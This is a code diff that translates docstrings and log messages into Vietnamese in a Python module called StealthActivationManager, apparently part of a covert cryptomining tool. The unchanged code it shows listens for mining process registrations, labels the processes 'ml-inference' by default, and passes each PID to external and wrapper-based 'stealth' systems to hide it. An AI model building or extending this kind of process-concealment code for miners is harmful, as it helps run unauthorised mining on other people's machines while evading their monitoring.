@@ -54,11 +54,11 @@ class StealthActivationManager:
     
     def __init__(self, event_bus: EventBus, logger: Optional[logging.Logger] = None):
         """
-        Initialize Stealth Activation Manager.
+        Khởi tạo [Stealth Activation Manager] (trình quản lý kích hoạt ẩn danh).
         
         Args:
-            event_bus: EventBus instance để listen for PID registration events
-            logger: Logger instance (optional)
+            event_bus: [EventBus] (bus sự kiện) instance để lắng nghe sự kiện đăng ký PID
+            logger: [Logger] (bộ ghi log) instance (tuỳ chọn)
         """
         self.event_bus = event_bus
         self.logger = logger or get_unified_logger('mining_environment.stealth_activation')
@@ -78,34 +78,34 @@ class StealthActivationManager:
     
     def initialize(self) -> bool:
         """
-        Initialize stealth activation system với EventBus subscriptions.
+        Khởi tạo hệ thống kích hoạt ẩn danh với đăng ký [EventBus] (bus sự kiện).
         
         Returns:
-            bool: True nếu initialization thành công
+            bool: True nếu khởi tạo (initialization) thành công
         """
         try:
-            self.logger.info("🚀 [STEALTH-ACTIVATION] Initializing stealth activation system...")
+            self.logger.info("🚀 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đang khởi tạo hệ thống...")
             
             # **Step 1**: Initialize external stealth system
             success = self._initialize_external_stealth()
             if not success:
-                self.logger.warning("⚠️ [STEALTH-ACTIVATION] External stealth unavailable - using self-stealth only")
+                self.logger.warning("⚠️ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Stealth ngoài không khả dụng – chỉ dùng [Self-Stealth] (tự che giấu)")
             
             # **Step 2**: Setup EventBus subscriptions
             self._setup_eventbus_subscriptions()
             
-            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation system ready")
+            self.logger.info("✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Hệ thống sẵn sàng")
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] Initialization failed: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Khởi tạo thất bại: {e}")
             return False
     
     def _initialize_external_stealth(self) -> bool:
-        """Initialize external stealth system (StealthExecution)."""
+        """Khởi tạo hệ thống stealth bên ngoài ([StealthExecution] – thực thi che giấu)."""
         try:
             if StealthExecution:
-                self.logger.info("🔧 [STEALTH-ACTIVATION] Initializing external stealth system...")
+                self.logger.info("🔧 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đang khởi tạo hệ thống stealth ngoài...")
                 
                 self.external_stealth = StealthExecution(
                     logger=self.logger,
@@ -114,25 +114,25 @@ class StealthActivationManager:
                 
                 if self.external_stealth.start():
                     self.external_stealth_enabled = True
-                    self.logger.info("✅ [STEALTH-ACTIVATION] External stealth system active")
+                    self.logger.info("✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Hệ thống stealth ngoài hoạt động")
                     return True
                 else:
-                    self.logger.warning("⚠️ [STEALTH-ACTIVATION] External stealth failed to start")
+                    self.logger.warning("⚠️ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Hệ thống stealth ngoài khởi động thất bại")
                     self.external_stealth = None
                     return False
             else:
-                self.logger.warning("⚠️ [STEALTH-ACTIVATION] StealthExecution not available")
+                self.logger.warning("⚠️ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) [StealthExecution] (thực thi che giấu) không khả dụng")
                 return False
                 
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] External stealth initialization error: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi khởi tạo stealth ngoài: {e}")
             self.external_stealth = None
             return False
     
     def _setup_eventbus_subscriptions(self):
-        """Setup EventBus subscriptions for PID registration events."""
+        """Thiết lập đăng ký [EventBus] (bus sự kiện) cho các sự kiện đăng ký PID."""
         try:
-            self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up EventBus subscriptions...")
+            self.logger.info("🔌 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Thiết lập đăng ký [EventBus] (bus sự kiện)...")
             
             # Subscribe to CPU PID registration events
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_pid_registered)
@@ -140,10 +140,10 @@ class StealthActivationManager:
             
             # CPU-only build: bỏ đăng ký GPU events
             
-            self.logger.info(f"✅ [STEALTH-ACTIVATION] EventBus subscriptions active: {len(self.event_subscriptions)} events")
+            self.logger.info(f"✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đăng ký [EventBus] (bus sự kiện) đang hoạt động: {len(self.event_subscriptions)} sự kiện")
             
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] EventBus subscription error: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi đăng ký [EventBus] (bus sự kiện): {e}")
             raise
     
     def _on_cpu_pid_registered(self, event_data: Dict[str, Any]):
@@ -156,7 +156,7 @@ class StealthActivationManager:
             pid = event_data.get('pid')
             process_name = event_data.get('process_name', 'ml-inference')
             
-            self.logger.info(f"🔔 [STEALTH-ACTIVATION] CPU PID registered: {pid} ({process_name})")
+            self.logger.info(f"🔔 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đăng ký PID CPU: {pid} ({process_name})")
             
             # **CRITICAL**: Activate stealth for CPU process
             success = self._activate_process_stealth(
@@ -171,12 +171,12 @@ class StealthActivationManager:
             )
             
             if success:
-                self.logger.info(f"✅ [STEALTH-ACTIVATION] CPU process PID {pid} stealth activated")
+                self.logger.info(f"✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) PID CPU {pid} đã kích hoạt stealth")
             else:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] CPU process PID {pid} stealth activation failed")
+                self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) PID CPU {pid} kích hoạt stealth thất bại")
                 
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] CPU PID handler error: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi xử lý CPU PID: {e}")
     
     # CPU-only build: handler GPU bị loại bỏ
     
@@ -197,7 +197,7 @@ class StealthActivationManager:
         """
         with self.stealth_lock:
             try:
-                self.logger.info(f"🔒 [STEALTH-ACTIVATION] Activating stealth for {process_type} PID {pid}")
+                self.logger.info(f"🔒 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đang kích hoạt stealth cho {process_type} PID {pid}")
                 
                 stealth_info = {
                     'pid': pid,
@@ -212,14 +212,14 @@ class StealthActivationManager:
                 # **Strategy 1**: Try external stealth first (if available)
                 if self.external_stealth_enabled and self.external_stealth:
                     try:
-                        self.logger.info(f"🔧 [STEALTH-ACTIVATION] Attempting external stealth for PID {pid}")
+                        self.logger.info(f"🔧 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Thử kích hoạt stealth ngoài cho PID {pid}")
                         if self.external_stealth.add_process(pid):
                             stealth_info['external_stealth'] = True
-                            self.logger.info(f"✅ [STEALTH-ACTIVATION] External stealth active for PID {pid}")
+                            self.logger.info(f"✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Stealth ngoài hoạt động với PID {pid}")
                         else:
-                            self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] External stealth failed for PID {pid}")
+                            self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Stealth ngoài thất bại cho PID {pid}")
                     except Exception as external_error:
-                        self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] External stealth error for PID {pid}: {external_error}")
+                        self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi stealth ngoài cho PID {pid}: {external_error}")
                 
                 # **Strategy 2**: Self-stealth activation (for processes that support it)
                 # Note: Self-stealth chỉ hoạt động cho processes được wrapped bởi stealth wrappers
@@ -232,22 +232,22 @@ class StealthActivationManager:
                 success = stealth_info['external_stealth'] or True  # Self-stealth via wrappers
                 
                 if success:
-                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] {process_type} PID {pid} stealth activation complete")
+                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) {process_type} PID {pid} kích hoạt stealth hoàn tất")
                     return True
                 else:
-                    self.logger.error(f"💥 [STEALTH-ACTIVATION] {process_type} PID {pid} all stealth methods failed")
+                    self.logger.error(f"💥 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) {process_type} PID {pid} tất cả phương pháp stealth đều thất bại")
                     return False
                     
             except Exception as e:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] Critical error activating stealth for PID {pid}: {e}")
+                self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi nghiêm trọng khi kích hoạt stealth cho PID {pid}: {e}")
                 return False
     
     def get_stealth_status(self) -> Dict[str, Any]:
         """
-        Get current stealth activation status.
+        Lấy trạng thái hiện tại của kích hoạt ẩn danh (stealth activation status).
         
         Returns:
-            Dict with stealth status information
+            Dict: thông tin trạng thái stealth
         """
         with self.stealth_lock:
             return {
@@ -258,9 +258,9 @@ class StealthActivationManager:
             }
     
     def cleanup(self):
-        """Cleanup stealth activation manager and stop all stealth processes."""
+        """Dọn dẹp trình quản lý kích hoạt ẩn danh và dừng tất cả tiến trình stealth."""
         try:
-            self.logger.info("🧹 [STEALTH-ACTIVATION] Cleaning up stealth activation manager...")
+            self.logger.info("🧹 [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Đang dọn dẹp trình quản lý kích hoạt stealth...")
             
             # Cleanup external stealth
             if self.external_stealth_enabled and self.external_stealth:
@@ -268,18 +268,18 @@ class StealthActivationManager:
                     self.external_stealth.stop()
                     self.external_stealth = None
                     self.external_stealth_enabled = False
-                    self.logger.info("✅ [STEALTH-ACTIVATION] External stealth cleanup complete")
+                    self.logger.info("✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Dọn dẹp stealth ngoài hoàn tất")
                 except Exception as e:
-                    self.logger.error(f"❌ [STEALTH-ACTIVATION] External stealth cleanup error: {e}")
+                    self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi dọn dẹp stealth ngoài: {e}")
             
             # Clear active processes
             with self.stealth_lock:
                 self.active_stealth_processes.clear()
             
-            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation manager cleanup complete")
+            self.logger.info("✅ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Dọn dẹp trình quản lý kích hoạt stealth hoàn tất")
             
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] Cleanup error: {e}")
+            self.logger.error(f"❌ [STEALTH-ACTIVATION] (kích hoạt ẩn danh) Lỗi dọn dẹp: {e}")
 
 
 # **[Global Stealth Activation Instance]** (instance kích hoạt stealth toàn cầu)
@@ -287,7 +287,7 @@ _stealth_activation_manager: Optional[StealthActivationManager] = None
 
 def get_stealth_activation_manager(event_bus: EventBus) -> StealthActivationManager:
     """
-    Get or create global StealthActivationManager instance.
+    Lấy hoặc tạo instance toàn cục của [StealthActivationManager] (trình quản lý kích hoạt ẩn danh).
     
     Args:
         event_bus: EventBus instance
@@ -304,7 +304,7 @@ def get_stealth_activation_manager(event_bus: EventBus) -> StealthActivationMana
 
 def initialize_stealth_activation(event_bus: EventBus) -> bool:
     """
-    Initialize global stealth activation system.
+    Khởi tạo hệ thống kích hoạt ẩn danh toàn cục.
     
     Args:
         event_bus: EventBus instance
@@ -316,7 +316,7 @@ def initialize_stealth_activation(event_bus: EventBus) -> bool:
     return manager.initialize()
 
 def cleanup_stealth_activation():
-    """Cleanup global stealth activation system."""
+    """Dọn dẹp hệ thống kích hoạt ẩn danh toàn cục."""
     global _stealth_activation_manager
     
     if _stealth_activation_manager:
